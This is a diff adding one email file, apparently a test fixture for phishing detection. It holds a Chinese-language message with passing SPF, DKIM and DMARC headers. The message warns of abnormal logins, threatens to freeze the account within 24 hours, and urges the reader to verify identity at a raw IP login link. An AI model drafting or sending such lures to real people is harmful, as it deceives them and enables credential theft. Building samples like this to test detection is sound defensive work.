@@ -1,0 +1,12 @@
+From: =?utf-8?B?5rWL6K+V5pSv5oyB?= <it-support@partner.example>
+To: employee@corp.internal
+Date: Thu, 13 Aug 2026 10:00:00 +0800
+Message-ID: <ev24@partner.example>
+Received: from mail.partner.example (mail.partner.example [198.51.100.9])
+  by mx.corp.internal with ESMTPS id OK99;
+Authentication-Results: mx.corp.internal; spf=pass (sender of IP 198.51.100.9 allowed) smtp.mailfrom=partner.example; dkim=pass header.d=partner.example; dmarc=pass header.from=partner.example
+Subject: 邮箱安全验证提醒
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body><p>尊敬的用户：系统检测到您的账户存在异常登录，为保障您的资金安全，请立即点击下方链接验证身份，24小时内未验证将冻结账户。</p><p><a href='http://203.0.113.60/verify/login'>http://203.0.113.60/verify/login</a></p></body></html>
